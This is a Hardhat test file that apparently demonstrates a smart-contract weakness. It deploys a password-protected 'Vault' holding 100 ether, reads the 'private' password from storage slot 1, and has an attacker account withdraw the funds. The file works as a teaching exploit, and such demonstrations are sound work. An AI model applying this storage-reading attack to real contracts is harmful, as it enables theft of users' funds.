const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Vault', () => {
    let deployer, attacker;
    beforeEach(async function () {
        [deployer, attacker] = await ethers.getSigners();
        const Vault = await ethers.getContractFactory('Vault', deployer);
        this.vault = await Vault.deploy(ethers.utils.formatBytes32String('myPassword'));
        await this.vault.deposit({ value: ethers.utils.parseEther('100') });
    });

    it('Should return owner of the vault', async function () {
        expect(await this.vault.owner()).to.eq(deployer.address);
    });
    it('Should be able to retrive private state variables', async function () {
        const initBalanceContract = await ethers.provider.getBalance(this.vault.address);
        const initBalanceAttacker = await ethers.provider.getBalance(attacker.address);
        console.log('Contract Init balance', ethers.utils.formatEther(initBalanceContract.toString()));
        console.log('Attacker Init balance', ethers.utils.formatEther(initBalanceAttacker.toString()));

        const pwd = await ethers.provider.getStorageAt(this.vault.address, 1);
        console.log('Byte32', pwd);
        console.log('Password', ethers.utils.parseBytes32String(pwd));

        await this.vault.connect(attacker).withDraw(pwd);

        const finalBalanceContract = await ethers.provider.getBalance(this.vault.address);
        const finalBalanceAttacker = await ethers.provider.getBalance(attacker.address);
        console.log('Contract final balance', ethers.utils.formatEther(finalBalanceContract.toString()));
        console.log('Attacker final balance', ethers.utils.formatEther(finalBalanceAttacker.toString()));
    });
});
